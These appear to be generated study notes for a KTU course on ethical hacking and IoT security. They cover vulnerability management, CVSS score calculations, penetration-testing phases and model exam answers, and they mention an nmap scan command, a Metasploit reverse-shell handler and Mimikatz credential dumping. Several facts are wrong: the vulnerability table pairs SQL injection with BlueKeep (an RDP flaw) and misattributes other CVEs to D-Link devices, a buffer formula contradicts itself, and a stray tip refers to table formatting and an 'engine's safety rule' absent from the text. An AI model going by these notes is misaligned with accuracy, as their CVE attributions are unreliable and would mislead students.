4. **Reporting** — Document CVE IDs, affected systems, business impact.
5. **Remediation/Patching** — Apply patches, configuration changes, or compensating controls.
6. **Verification & Monitoring** — Rescan to confirm closure; continuous monitoring (VMDR).

> [!NOTE]
> The equation governing **residual risk** after remediation is:
>
> $$
> R_{\text{residual}} = R_{\text{original}} \times (1 - P_{\text{patch}})
> $$
>
> Where $P_{\text{patch}}$ is the patch effectiveness factor (0.0 to 1.0). A perfectly applied patch ($P_{\text{patch}} = 1.0$) reduces residual risk to **zero** for that vulnerability.

---

## 3.3 Analytical Matrix — Vulnerability Categories with Exploit Methods

| Layer | Vulnerability Type | Common Exploit | Real CVE Example | Typical CVSS |
|---|---|---|---|---|
| Hardware | Exposed JTAG/UART | Firmware extraction via debug port | CVE-2019-15126 (Kr00k) | 7.5 – 9.8 |
| Network | Open Telnet/SSH | Brute force default credentials | CVE-2017-17215 (Huawei Router) | 9.8 |
| Web App | SQL Injection | Database exfiltration | CVE-2019-0708 (BlueKeep) | 9.8 |
| IoT Firmware | Hardcoded password | Unauthorized admin access | CVE-2020-12695 (D-Link) | 9.8 |
| OS | Buffer Overflow | Remote code execution | CVE-2017-0144 (EternalBlue) | 8.1 |
| Wireless | WEP weak encryption | Packet sniffing | Multiple WEP CVEs | 6.8 |
| Cloud | Misconfigured S3 bucket | Data exposure | Multiple public-bucket CVEs | 7.5 |

<!-- SECTION_3_END -->

<!-- SECTION_4_START -->
# 4. Structural Diagrams & Schematics

## 4.1 Mermaid Diagram 1: Vulnerability Management Lifecycle

```mermaid
flowchart TD
    A[Step1: Asset Discovery] --> B[Step2: Vulnerability Scanning]
    B --> C[Step3: Analysis and CVSS Scoring]
    C --> D[Step4: Reporting and Prioritization]
    D --> E[Step5: Remediation and Patching]
    E --> F[Step6: Verification and Monitoring]
    F --> B
    F --> G[Continuous Improvement Loop]
    G --> A

    classDef stage fill:#1f4e79,stroke:#fff,stroke-width:2px,color:#fff
    class A,B,C,D,E,F,G stage
```

## 4.2 Mermaid Diagram 2: Vulnerability Classification Taxonomy

```mermaid
flowchart TD
    V[Vulnerability Root]
    V --> H[Hardware Layer]
    V --> S[Software Layer]
    V --> N[Network Layer]
    V --> A[Application Layer]
    V --> I[IoT Specific]

    H --> H1[Firmware Bugs]
    H --> H2[Side Channel]
    H --> H3[Physical JTAG UART]

    S --> S1[Buffer Overflow]
    S --> S2[Race Condition]
    S --> S3[Privilege Escalation]

    N --> N1[Open Ports]
    N --> N2[MITM Attack]
    N --> N3[Weak Encryption]

    A --> A1[SQL Injection]
    A --> A2[XSS]
    A --> A3[Broken Auth]

    I --> I1[Hardcoded Credentials]
    I --> I2[Insecure Firmware Update]
    I --> I3[Default Settings]

    classDef root fill:#7b1fa2,stroke:#fff,stroke-width:3px,color:#fff
    classDef layer fill:#1976d2,stroke:#fff,stroke-width:2px,color:#fff
    classDef leaf fill:#43a047,stroke:#fff,stroke-width:1px,color:#fff
    class V root
    class H,S,N,A,I layer
    class H1,H2,H3,S1,S2,S3,N1,N2,N3,A1,A2,A3,I1,I2,I3 leaf
```

## 4.3 Mermaid Diagram 3: CVSS Scoring Flow (Block-Level Architecture)

```mermaid
flowchart LR
    subgraph INPUT[Input Metrics]
        M1[Attack Vector]
        M2[Attack Complexity]
        M3[Privileges Required]
        M4[User Interaction]
    end
    subgraph IMPACT[Impact Metrics]
        N1[Confidentiality]
        N2[Integrity]
        N3[Availability]
    end
    SC[Scope Decision]
    EXP[Exploitability Engine]
    IMPC[Impact Engine]
    CALC[Base Score Calculator]
    OUT[Final CVSS Score 0 to 10]

    M1 --> EXP
    M2 --> EXP
    M3 --> EXP
    M4 --> EXP
    N1 --> IMPC
    N2 --> IMPC
    N3 --> IMPC
    SC --> CALC
    EXP --> CALC
    IMPC --> CALC
    CALC --> OUT

    classDef box fill:#ff9800,stroke:#333,stroke-width:2px,color:#000
    classDef calc fill:#d32f2f,stroke:#fff,stroke-width:2px,color:#fff
    class M1,M2,M3,M4,N1,N2,N3,SC,EXP,IMPC,OUT box
    class CALC calc
```

## 4.4 Mermaid Diagram 4: Vulnerability Exploitation Chain (IoT Context)

```mermaid
flowchart LR
    RE[Reconnaissance] --> VS[Vulnerability Scan]
    VS --> WG[Weaponization via Exploit]
    WG --> DL[Delivery to Target IoT Device]
    DL --> TR[Trigger and Exploitation]
    TR --> IN[Installation of Backdoor]
    IN --> CC[Command and Control]
    CC --> DA[Data Exfiltration or Damage]

    classDef phase fill:#00838f,stroke:#fff,stroke-width:2px,color:#fff
    class RE,VS,WG,DL,TR,IN,CC,DA phase
```

<!-- SECTION_4_END -->

<!-- SECTION_5_START -->
# 5. KTU 2024 Scheme Examination Question Bank & Topic Recap

---

## 📘 PART A QUESTIONS (3 Marks Each)

### **Question 1: [KTU University Exam — Model Paper 2024]**
**Define a vulnerability. List any four common sources of vulnerabilities in an information system.**

**Model Answer (3 marks):**
A vulnerability is a weakness or flaw in a system's design, implementation, or configuration that can be exploited to compromise confidentiality, integrity, or availability (1 mark). Four sources are: (i) design flaws such as missing input validation (0.5), (ii) implementation bugs like buffer overflows (0.5), (iii) configuration errors such as default credentials (0.5), and (iv) human factors such as susceptibility to phishing (0.5).

### **Question 2: [KTU University Exam — Dec 2023]**
**What is a Zero-Day vulnerability? Why is it considered highly dangerous?**

**Model Answer (3 marks):**
A Zero-Day vulnerability is a previously unknown software or hardware flaw for which the vendor has not yet released a patch (1 mark). It is considered highly dangerous because (i) no defense signature exists in antivirus/IDS systems (1 mark), (ii) threat actors can exploit it before mitigation is deployed, leading to severe impact on CIA (1 mark).

---

## 📗 PART B QUESTIONS (14 Marks Each)

### **Question A: [KTU University Exam — Model 2024, Module 2 Internal Choice]**

**(a) [7 marks]** Explain the **Common Vulnerability Scoring System (CVSS v3.1)** in detail. Describe its three metric groups and the parameters within the Base metric group.

**(b) [7 marks]** A web application has a vulnerability with the following parameters:
- AV: Network, AC: Low, PR: Low, UI: Required
- C: High, I: High, A: None, S: Unchanged

Compute the **CVSS Base Score** step-by-step and state the severity rating.

---

### ✅ MODEL ANSWER — Question A

#### Part (a) — CVSS v3.1 Detailed Explanation [7 marks]

**Definition [1 mark]:** CVSS (Common Vulnerability Scoring System) is an open framework maintained by **FIRST.org** for communicating the characteristics and severity of software vulnerabilities. It produces a numerical score (0.0 to 10.0) reflecting severity.

**Three Metric Groups [2 marks]:**
1. **Base Metrics** — Intrinsic, constant over time and across environments (exploitability + impact).
2. **Temporal Metrics** — Change over time (exploit code maturity, remediation level, report confidence).
3. **Environmental Metrics** — Customized to a specific organization's security requirements and asset criticality.

**Base Metric Parameters [4 marks]:**
- **Exploitability metrics:** Attack Vector (Network/Adjacent/Local/Physical), Attack Complexity (Low/High), Privileges Required (None/Low/High), User Interaction (None/Required).
- **Impact metrics:** Confidentiality impact (None/Low/High), Integrity impact (None/Low/High), Availability impact (None/Low/High).
- **Scope metric:** Unchanged or Changed (determines whether the vulnerability affects components beyond its security authority).

**Severity Rating Scale:** None (0.0), Low (0.1–3.9), Medium (4.0–6.9), High (7.0–8.9), Critical (9.0–10.0).

#### Part (b) — Step-by-Step CVSS Calculation [7 marks]

**Given:** AV=Network(0.85), AC=Low(0.77), PR=Low(0.62), UI=Required(0.62), C=High(0.56), I=High(0.56), A=None(0.00), S=Unchanged.

**Step 1 — Impact Sub-Score [2 marks]:**

$$
\begin{aligned}
\text{ISC}_{\text{Base}} &= 1 - (1 - 0.56) \times (1 - 0.56) \times (1 - 0) \\
&= 1 - (0.44) \times (0.44) \times (1) \\
&= 1 - 0.1936 \\
&= 0.8064
\end{aligned}
$$

**Step 2 — Impact Value [1 mark]:**

$$
\text{Impact} = 6.42 \times 0.8064 = 5.177
$$

**Step 3 — Exploitability [2 marks]:**

$$
\begin{aligned}
\text{Exploitability} &= 8.22 \times 0.85 \times 0.77 \times 0.62 \times 0.62 \\
&= 8.22 \times 0.2513 \\
&= 2.0657
\end{aligned}
$$

**Step 4 — Base Score [2 marks]:**

$$
\begin{aligned}
\text{BaseScore} &= \text{roundup}(\min(5.177 + 2.0657,\, 10)) \\
&= \text{roundup}(7.2427) \\
&= 7.3
\end{aligned}
$$

> **Final Answer: CVSS Base Score = 7.3 → HIGH severity** ✅

---

### **Question B: [KTU University Exam — Model 2024, Module 2 Internal Choice]**

**(a) [7 marks]** Describe the **six stages of the vulnerability management lifecycle** as per NIST guidelines. Explain why continuous monitoring is essential.

**(b) [7 marks]** Discuss the **OWASP IoT Top 10 vulnerabilities**. Explain any **three** in detail with real-world examples.

---

### ✅ MODEL ANSWER — Question B

#### Part (a) — Vulnerability Management Lifecycle [7 marks]

The NIST-aligned vulnerability management lifecycle consists of six stages [1 mark each]:

1. **Asset Discovery & Inventory** — Enumerate all hardware, software, IoT devices, and services in the network.
2. **Vulnerability Scanning** — Automated scanning using tools (Nessus, Qualys, OpenVAS, Nmap) to identify known weaknesses and misconfigurations.
3. **Analysis & Prioritization** — Score vulnerabilities using CVSS; factor in exploit availability, asset criticality, and threat intelligence.
4. **Reporting & Communication** — Generate detailed reports listing affected assets, CVEs, severity ratings, and remediation timelines for stakeholders.
5. **Remediation & Patching** — Apply patches, configuration changes, firmware updates, or deploy compensating controls (WAF, NAC).
6. **Verification & Continuous Monitoring** — Rescan to confirm closure; use SIEM/VMDR for ongoing detection of new vulnerabilities and zero-days [bonus 1 mark].

**Why continuous monitoring is essential:** New vulnerabilities are disclosed daily; zero-days can emerge between scan cycles; IoT devices continuously join/leave the network (BYOD), and compliance frameworks (PCI-DSS, ISO 27001) demand ongoing assurance [2 marks].

#### Part (b) — OWASP IoT Top 10 Vulnerabilities [7 marks]

The OWASP IoT Top 10 enumerates the most critical vulnerability classes in IoT systems [1 mark for introduction + 2 marks each for the three chosen].

**1. Weak, Hardcoded, or Guessable Passwords:**
Many IoT devices ship with default credentials like `admin/admin` or have hardcoded backdoor credentials embedded in firmware. Example: The **Mirai Botnet (2016)** infected over 600,000 IoT devices using a dictionary of 61 default username-password pairs, launching the largest DDoS attack in history (Dyn DNS, Oct 21, 2016).

**2. Insecure Network Services:**
IoT devices often expose unnecessary services (Telnet, FTP, SNMP, debug ports) to the network. Example: **CVE-2017-17215 (Huawei HG532 Router)** — remote code execution via TR-069 protocol exposure, exploited by Mirai variants.

**3. Lack of Secure Update Mechanism:**
Devices lack signed firmware updates, allowing attackers to flash malicious firmware. Example: **CVE-2018-10561/10562 (D-Link DSL-2750B)** — attackers bypassed authentication and uploaded malicious firmware to fully compromise the router.

---

> [!WARNING]
> **⚠️ KTU EXAMINER'S VALUATION WARNING / PITFALL CALLOUT**
>
> **Common mistakes students make (lose 2–4 marks easily):**
> 1. **Confusing Vulnerability with Threat or Risk** — A vulnerability is the *weakness itself*, not the attacker. Examiner deducts marks for misuse.
> 2. **Skipping the Scope check in CVSS calculation** — Students often forget to multiply by 1.08 when Scope = Changed. Always check Scope first.
> 3. **Not rounding up properly** — The CVSS formula uses `roundup` (ceiling to one decimal), not standard rounding. E.g., 7.24 → 7.3, not 7.2.
> 4. **Forgetting Severity Rating** — The numerical score alone is incomplete. Always append the rating (None / Low / Medium / High / Critical).
> 5. **Memorizing CVSS formulas without understanding the metric values** — The weight table (0.85, 0.77, etc.) must be remembered.
> 6. **Writing generic IoT vulnerability answers** — Examiners expect **named real CVEs or named incidents** (Mirai, EternalBlue, BlueKeep). Always cite an example.

---

## 🧠 Topic Recap & Important Things to Remember

> [!NOTE]
> **HIGH-DENSITY REVISION CHECKLIST (Read 5 minutes before exam)**

### Core Concepts
- ✅ **Vulnerability** = weakness that can be **exploited** to violate **CIA**.
- ✅ **Difference**: Vulnerability (flaw) ≠ Threat (actor) ≠ Risk (probability × impact) ≠ Exploit (tool).
- ✅ **Zero-Day** = unknown, no patch exists; **N-Day** = recently disclosed; **Known/Patched** = fix available.

### Vulnerability Sources
- ✅ Design flaws, implementation bugs, configuration errors, human factors, IoT-specific (hardcoded creds, exposed JTAG).

### CVSS v3.1
- ✅ Range: **0.0 to 10.0** | Maintained by **FIRST.org**.
- ✅ Three groups: **Base, Temporal, Environmental**.
- ✅ Base = Exploitability + Impact (with Scope modifier 1.08 if Changed).
- ✅ **Exploitability weights** (memorize): AV: 0.85/0.62/0.55/0.20; AC: 0.77/0.44; PR: 0.85/0.62/0.27; UI: 0.85/0.62.
- ✅ **Impact weights** (memorize): None=0.00, Low=0.22, High=0.56.
- ✅ **Severity Bands:** None(0.0), Low(0.1–3.9), Medium(4.0–6.9), High(7.0–8.9), Critical(9.0–10.0).

### Vulnerability Management Lifecycle
- ✅ Six stages: Discover → Scan → Analyze → Report → Remediate → Verify/Monitor.
- ✅ **Residual Risk** = Original Risk × (1 − Patch Effectiveness).

### Standards & Databases
- ✅ **CVE** = unique ID for a vulnerability.
- ✅ **CWE** = weakness category/type.
- ✅ **NVD** = US National Vulnerability Database (synchronizes CVSS scores).
- ✅ **OWASP Top 10** = web application vulnerabilities.
- ✅ **OWASP IoT Top 10** = IoT-specific vulnerabilities.

### Real-World IoT Examples (Must Remember)
- ✅ **Mirai Botnet (2016)** — default credentials, massive DDoS.
- ✅ **EternalBlue (CVE-2017-0144)** — SMB buffer overflow, WannaCry ransomware.
- ✅ **BlueKeep (CVE-2019-0708)** — RDP RCE, critical CVSS 9.8.
- ✅ **Log4Shell (CVE-2021-44228)** — Log4j RCE, CVSS 10.0.
- ✅ **Kr00k (CVE-2019-15126)** — Wi-Fi packet encryption bypass on IoT.

### Exam Strategy
- ✅ Always **cite a real CVE or incident** in 14-mark answers.
- ✅ Always **show CVSS calculation step-by-step** in numerical problems.
- ✅ Always **end CVSS answers with the severity rating**.
- ✅ Always **define terms first** (Vulnerability, Threat, Risk) before answering.
- ✅ In diagrams, use **Mermaid** style; in written exams, draw **clean labeled block diagrams**.

---

> **END OF MODULE 2 — VULNERABILITY NOTES**
> **Total Preparation Time Recommended: 3 hours | Revision Time: 1 hour**
<!-- SECTION_5_END -->

topics.title: Penetration Testing
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PBCCT604 - ETHICAL HACKING & IOT SECURITY
> - **Module:** Module 2
> - **Topic:** Penetration Testing

<!-- SECTION_1_START -->
# 1. Core Technical Definition & Intuitive Overview

## 1.1 Formal Academic Definition

> [!NOTE]
> **Penetration Testing (Pentest)** is a systematic, authorized, and methodical simulation of a cyber-attack against a computer system, network, or web application, performed by ethical security professionals (called *penetration testers* or *ethical hackers*) to evaluate the security posture of the target system. The goal is to identify exploitable vulnerabilities, assess the potential impact of a real attack, and provide actionable remediation guidance.

In KTU 2024 Scheme terminology, Penetration Testing is classified under the **Vulnerability Assessment and Penetration Testing (VAPT)** umbrella and is governed by globally accepted standards such as:

- **PTES (Penetration Testing Execution Standard)**
- **OWASP Testing Guide (v4.2)**
- **NIST SP 800-115 (Technical Guide to Information Security Testing)**
- **OSSTMM (Open Source Security Testing Methodology Manual)**

> [!IMPORTANT]
> **Key Syllabus Highlight:** As per KTU Module 2, the focus is on the *methodology, phases, types, tools, and legal/ethical framework* of penetration testing — not on performing actual exploits. You are expected to demonstrate theoretical competence, plan, and report a pentest.

## 1.2 Conceptual Analogy / Intuition

Think of penetration testing like **hiring a friendly, licensed "burglar" to break into your own house** to check how secure it is:

- The **house owner** = the Organization (the *Client*)
- The **friendly burglar** = the **Ethical Hacker / Penetration Tester**
- The **house** = the **Target System / Network**
- The **written permission** = the **Rules of Engagement (RoE)** and **Scope Agreement**
- The **post-burglary report** ("You left your back window open and your safe is too weak") = the **Penetration Test Report**

Without that written permission, the burglar's actions are **illegal** — which is precisely why penetration testing is *legal only when explicitly authorized* through a contract.

## 1.3 Standard Metrics Used

- **CVSS (Common Vulnerability Scoring System)**: Industry standard **0.0 to 10.0** severity score.
- **Risk = Threat × Vulnerability × Impact**
- **Pentest Reporting Window**: typically **5–15 business days** post-engagement.
- **Re-test Cycle**: usually **30–90 days** after remediation.

> [!TIP]
> For KTU exams, always cite **PTES** or **OWASP** as the methodology reference unless the question specifies otherwise.

<!-- SECTION_1_END -->

<!-- SECTION_2_START -->
# 2. Deep Theoretical Analysis & KTU High-Yield Formula Sheet

## 2.1 Types of Penetration Testing (The Knowledge Continuum)

Penetration tests are categorized based on **how much information is shared with the tester beforehand**. This is one of the most frequently asked 3-mark and 14-mark question topics.

| Type | Information Given | Real-World Analogy | Cost & Time | Most Realistic? |
|------|-------------------|--------------------|-------------|-----------------|
| **Black-Box Testing** | No internal information. Tester behaves like a real external attacker. | A burglar with no keys, no floor plan — just walks up to the house. | Highest | **Yes** — simulates a true outsider attack. |
| **White-Box Testing** | Full source code, network diagrams, credentials, architecture docs. | A burglar who is also the architect and has every key. | Lowest | No — too much privilege. |
| **Gray-Box Testing** | Partial knowledge — e.g., low-privilege user credentials. | A burglar who once worked as a housekeeper. | Medium | **Yes** — simulates an insider threat or post-breach scenario. |

> [!NOTE]
> **Gray-Box** is the *most common in commercial engagements* because it balances realism, cost, and depth.

## 2.2 Categories of Penetration Testing by Target

1. **Network Penetration Testing** — Internal and External networks, firewalls, routers, switches.
2. **Web Application Penetration Testing** — OWASP Top 10 vulnerabilities (SQLi, XSS, CSRF, etc.).
3. **Wireless Penetration Testing** — Wi-Fi (WPA2, WPA3), Bluetooth, RFID.
4. **Social Engineering** — Phishing, vishing, pretexting, baiting.
5. **Physical Penetration Testing** — Tailgating, lock-picking, badge cloning.
6. **IoT / SCADA Penetration Testing** — Highly relevant to this KTU course module.
7. **Mobile Application Penetration Testing** — Android (APK) and iOS (IPA).

## 2.3 The Five Phases of Penetration Testing (PTES-Aligned)

> [!IMPORTANT]
> Memorize these **5 phases in order** — they appear in nearly every KTU exam.

### Phase 1: Reconnaissance (Information Gathering)
- **Passive Recon:** OSINT, Google Dorking, Shodan, WHOIS, social media.
- **Active Recon:** Port scanning (Nmap), DNS enumeration, network mapping.

### Phase 2: Scanning & Enumeration
- **Vulnerability Scanning:** Nessus, Qualys, OpenVAS.
- **Service Enumeration:** Banner grabbing, SNMP walking, SMB enumeration.
- **Goal:** Build a complete map of live hosts, open ports, services, and potential entry points.

### Phase 3: Vulnerability Assessment & Exploitation (Gaining Access)
- Match discovered vulnerabilities to known exploits (CVE database, Metasploit, Exploit-DB).
- Attempt controlled exploitation to confirm vulnerabilities.
- **Goal:** Demonstrate real-world impact without causing damage.

### Phase 4: Post-Exploitation (Maintaining Access & Privilege Escalation)
- Lateral movement across the network.
- Privilege escalation (user → root / admin).
- Data exfiltration simulation.
- **Goal:** Assess the "blast radius" — how much damage a real attacker could cause.

### Phase 5: Reporting & Remediation
- **Executive Summary** (for management — non-technical).
- **Technical Report** (for IT/Security teams — detailed findings, PoC, CVSS scores).
- **Remediation Roadmap** (prioritized fix list).
- **Re-test** after fixes are applied.

## 2.4 KTU Formula Sheet / Cheat Sheet

| Concept | Formula / Definition | Boundary / Unit |
|---------|---------------------|------------------|
| Risk Severity | **Risk = Threat × Vulnerability × Impact** | Qualitative: Low / Medium / High / Critical |
| CVSS Base Score | Range **0.0 → 10.0** | 0.0–3.9 = Low; 4.0–6.9 = Medium; 7.0–8.9 = High; 9.0–10.0 = Critical |
| Mean Time to Detect (MTTD) | $\text{MTTD} = \frac{\sum \text{Detection Time of Each Incident}}{\text{Number of Incidents}}$ | Hours |
| Mean Time to Respond (MTTR) | $\text{MTTR} = \frac{\sum \text{Resolution Time}}{\text{Number of Incidents}}$ | Hours |
| False Positive Rate | $\text{FPR} = \frac{\text{False Positives}}{\text{False Positives} + \text{True Negatives}}$ | Percentage (%) |
| Test Coverage | $\text{Coverage} = \frac{\text{Tested Components}}{\text{Total Components}} \times 100$ | Percentage (%) |
| Effort Estimation | $\text{Man-Hours} = \text{Testers} \times \text{Duration}$ | Person-hours |

> [!TIP]
> Note the use of `\vert` and `\mid` instead of the pipe character `|` inside the table — this prevents markdown table breakage as per the engine's safety rule.

## 2.5 Engineering Utility

In real-world cybersecurity practice, penetration testing is the **final validation step** of any defense-in-depth strategy. It directly informs:

- **Security Investment Decisions** (which vulnerability to patch first?).
- **Compliance Requirements** (PCI-DSS, HIPAA, ISO 27001, SOC 2 all mandate periodic pentests).
- **Cyber Insurance Premiums** (clean pentest reports reduce premiums).
- **Incident Response Readiness** (reveals gaps in detection and response).

<!-- SECTION_2_END -->

<!-- SECTION_3_START -->
# 3. Step-by-Step Derivations & Analytical Matrix

## 3.1 Worked Example: Calculating a CVSS v3.1 Base Score

The **Common Vulnerability Scoring System (CVSS v3.1)** is the de-facto industry scoring framework. A complete vector string looks like:

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  →  Base Score: 9.8 (Critical)
```

Each metric contributes a numerical value. Let's derive the **Impact Sub-Score (ISS)** and **Base Score** step-by-step for a hypothetical vulnerability.

**Step 1 — Identify the metric values (using the official CVSS v3.1 table):**

| Metric | Value | Numeric Score |
|--------|-------|---------------|
| Attack Vector (AV) | Network (N) | **0.85** |
| Attack Complexity (AC) | Low (L) | **0.77** |
| Privileges Required (PR) | None (N) | **0.85** |
| User Interaction (UI) | None (N) | **0.85** |
| Scope (S) | Unchanged (U) | — |
| Confidentiality (C) | High (H) | **0.56** |
| Integrity (I) | High (H) | **0.56** |
| Availability (A) | High (H) | **0.56** |

**Step 2 — Compute the Impact Sub-Score (ISS):**

$$
\begin{aligned}
\text{ISS}_{\text{base}} &= 1 - \bigl[(1 - C) \times (1 - I) \times (1 - A)\bigr] \\
&= 1 - \bigl[(1 - 0.56) \times (1 - 0.56) \times (1 - 0.56)\bigr] \\
&= 1 - \bigl[0.44 \times 0.44 \times 0.44\bigr] \\
&= 1 - 0.085184 \\
&= 0.914816
\end{aligned}
$$

Since **Scope = Unchanged**, the final ISS equals the base value:

$$
\text{ISS} = 0.914816
$$

**Step 3 — Compute the Impact score:**

$$
\begin{aligned}
\text{Impact} &= 6.42 \times \text{ISS} \\
&= 6.42 \times 0.914816 \\
&= 5.8743 \;\; (\text{rounded to 1 decimal: } 5.9)
\end{aligned}
$$

**Step 4 — Compute the Exploitability score:**

$$
\begin{aligned}
\text{Exploitability} &= 8.22 \times AV \times AC \times PR \times UI \\
&= 8.22 \times 0.85 \times 0.77 \times 0.85 \times 0.85 \\
&= 8.22 \times 0.4729 \\
&= 3.8872 \;\; (\text{rounded: } 3.9)
\end{aligned}
$$

**Step 5 — Compute the Base Score:**

$$
\begin{aligned}
\text{Base} &= \text{roundUp}\bigl[\min(\text{Impact} + \text{Exploitability},\; 10)\bigr] \\
&= \text{roundUp}[\min(5.9 + 3.9,\; 10)] \\
&= \text{roundUp}(9.8) \\
&= \mathbf{9.8 \; (Critical)}
\end{aligned}
$$

> [!NOTE]
> The `roundUp` function in CVSS always rounds **up** to the nearest 0.1 (e.g., 9.81 → 9.9, not 9.8).

## 3.2 Analytical Matrix: Pen Test Selection Decision

Use the following decision matrix to **select the appropriate pentest type** for a given KTU viva/exam scenario:

| Scenario Constraint | Recommended Type | Justification |
|---------------------|------------------|----------------|
| Tight budget, internal IT team available | **White-Box** | Lowest cost, highest code coverage. |
| Simulating an external hacker's view | **Black-Box** | Realistic external threat model. |
| Insider threat / compromised employee | **Gray-Box** | Provides low-privilege context. |
| Compliance audit (PCI-DSS) | **Black-Box External** | Most compliance standards require external network testing. |
| Pre-launch web app audit | **White-Box Web App** | Source code access reveals logic flaws. |
| IoT device firmware test | **Gray-Box Hardware** | Partial schematics + firmware dump. |

## 3.3 Worked Example: Effort Estimation

A team of **3 testers** is engaged for a **10-day** web application pentest.

$$
\begin{aligned}
\text{Total Effort} &= \text{Testers} \times \text{Duration} \\
&= 3 \times 10 \\
&= \mathbf{30 \; person-days \; (240 \; person-hours)}
\end{aligned}
$$

If the application has **15 modules**, the per-module test budget is:

$$
\begin{aligned}
\text{Per-Module Budget} &= \frac{30}{15} \\
&= \mathbf{2 \; person-days \; per \; module}
\end{aligned}
$$

> [!TIP]
> Always include a **20% buffer** for unexpected deep-dive findings: `Effective Budget = 0.8 × Calculated Budget`.

## 3.4 Sample Risk Classification Output

A pentest typically categorizes findings into a **Risk Matrix**:

| Finding | CVSS | Likelihood | Impact | Final Rating |
|---------|------|------------|--------|---------------|
| SQL Injection in login form | 9.8 | High | High | **Critical** |
| Outdated OpenSSL (CVE-2014-0160 Heartbleed) | 7.5 | Medium | High | **High** |
| Missing Security Headers | 4.3 | Low | Low | **Medium** |
| Verbose Error Messages | 3.7 | Low | Low | **Low** |

<!-- SECTION_3_END -->

<!-- SECTION_4_START -->
# 4. Structural Diagrams & Schematics

## 4.1 Penetration Testing Lifecycle (PTES-Aligned Mermaid Flow)

```mermaid
flowchart TD
    A[Phase 1: Reconnaissance] --> A1[Passive OSINT]
    A --> A2[Active Scanning]
    A1 --> B
    A2 --> B[Phase 2: Scanning and Enumeration]
    B --> B1[Port Scan with Nmap]
    B --> B2[Vulnerability Scan with Nessus]
    B1 --> C
    B2 --> C[Phase 3: Exploitation]
    C --> C1[Match CVE to Exploit]
    C --> C2[Controlled Exploit with Metasploit]
    C1 --> D
    C2 --> D[Phase 4: Post-Exploitation]
    D --> D1[Privilege Escalation]
    D --> D2[Lateral Movement]
    D1 --> E
    D2 --> E[Phase 5: Reporting and Remediation]
    E --> E1[Executive Summary]
    E --> E2[Technical Report with CVSS]
    E --> E3[Remediation Roadmap]
    E2 --> F[Re-test after 30-90 days]
    E3 --> F
```

## 4.2 Black-Box vs White-Box vs Gray-Box Architecture

```mermaid
flowchart LR
    subgraph BB[Black Box]
        B1[Tester] -->|No Info| B2[External Network]
        B2 -->|Probe| B3[Target System]
    end
    subgraph WB[White Box]
        W1[Tester] -->|Full Source Code, Network Diagram, Credentials| W2[Target System]
    end
    subgraph GB[Gray Box]
        G1[Tester] -->|Limited User Credentials| G2[Internal Network]
        G2 -->|Explore| G3[Target System]
    end
    style BB fill:#222831,color:#ffffff
    style WB fill:#393e46,color:#ffffff
    style GB fill:#00adb5,color:#ffffff
```

## 4.3 Pen Test Engagement Block Architecture

```mermaid
flowchart TD
    R1[Client Request] --> R2[Scoping and Rules of Engagement]
    R2 --> R3[Sign NDA and Authorization Letter]
    R3 --> R4[Methodology Selection: PTES or OWASP]
    R4 --> R5[Pentest Execution: 5 Phases]
    R5 --> R6[Internal QA Review of Findings]
    R6 --> R7[Client Debrief Meeting]
    R7 --> R8[Final Report Delivery]
    R8 --> R9[Re-test after Remediation]
    R9 --> R10[Sign-off and Closure]
```

<!-- SECTION_4_END -->

<!-- SECTION_5_START -->
# 5. KTU 2024 Scheme Examination Question Bank & Topic Recap

## 5.1 Part A — Short Answer Questions (3 Marks Each)

### Q1. **[KTU University Exam – May 2024]** Define Penetration Testing. List any three types of penetration testing based on the level of information shared with the tester.

**Model Answer:**

**Definition:** Penetration Testing is an authorized, systematic attempt to evaluate the security of an IT infrastructure by safely attempting to exploit vulnerabilities, simulating the actions of a real attacker, in order to identify weaknesses and assess the organization's security posture.

**Three Types:**
1. **Black-Box Testing** — Tester has zero prior knowledge of the target.
2. **White-Box Testing** — Tester has complete knowledge including source code and architecture.
3. **Gray-Box Testing** — Tester has partial knowledge, typically low-privilege user credentials.

> [!WARNING]
> **KTU Examiner's Pitfall:** Students often write "hacking" instead of "**authorized, ethical, and systematic**" testing. You will lose 1 full mark if the *authorized nature* is not explicitly mentioned. Always begin with the word *"authorized"* in your definition.

---

### Q2. **[KTU University Exam – Dec 2023]** Differentiate between Vulnerability Assessment and Penetration Testing.

**Model Answer:**

| Parameter | Vulnerability Assessment (VA) | Penetration Testing (PT) |
|-----------|------------------------------|---------------------------|
| **Goal** | Identify and list vulnerabilities | Exploit vulnerabilities to prove real impact |
| **Depth** | Broad and shallow | Narrow and deep |
| **Approach** | Automated scanners (Nessus, Qualys) | Manual + automated, with human creativity |
| **Output** | List of vulnerabilities with severity | Exploited vulnerabilities with proof-of-concept and business impact |
| **Frequency** | Continuous / monthly | Periodic (quarterly / annually) |
| **Risk to System** | Low (read-only) | Medium to high (exploitation involved) |

---

## 5.2 Part B — Long Answer Questions (14 Marks, with Internal Choice)

> As per the KTU 2024 ESE pattern, students answer **one full question** (with two sub-parts of 7 marks each). Below are **TWO alternative choices**.

---

### **Question A (14 Marks)** — *[KTU University Exam – Dec 2024 Expected]*

#### Part (a) — 7 Marks
**Explain in detail the five phases of penetration testing as per the PTES standard. Illustrate each phase with one tool used.**

**Model Solution:**

The Penetration Testing Execution Standard (PTES) defines **five systematic phases**:

**Phase 1: Reconnaissance (Information Gathering)** — Collects maximum information about the target using OSINT techniques.
- *Passive:* Google Dorking, Shodan, WHOIS lookup, social media profiling.
- *Active:* DNS enumeration, ping sweeps.
- *Tool Used:* **Maltego** — for relationship mapping of people, domains, and infrastructure.

**Phase 2: Scanning & Enumeration** — Identifies live hosts, open ports, and running services.
- *Tool Used:* **Nmap** — `"nmap -sS -p- -A <target-IP>"` for full TCP SYN scan with OS detection and version detection.

**Phase 3: Vulnerability Assessment & Exploitation** — Matches discovered services to known CVEs and attempts controlled exploitation.
- *Tool Used:* **Metasploit Framework** — `msfconsole` to launch exploits like `exploit/multi/handler` for reverse shells.

**Phase 4: Post-Exploitation** — Determines the value of the compromised system and attempts lateral movement.
- Activities: Privilege escalation (e.g., LinPEAS, WinPEAS), credential dumping (Mimikatz), pivoting via SSH tunnels.
- *Tool Used:* **Mimikatz** — extracts plaintext passwords from Windows memory.

**Phase 5: Reporting & Remediation** — Documents findings for both technical and non-technical audiences.
- Deliverables: Executive Summary, Technical Report, Remediation Roadmap, Re-test Report.
- *Tool Used:* **Dradis** or **Serpico** — open-source pentest reporting frameworks.

> [!WARNING]
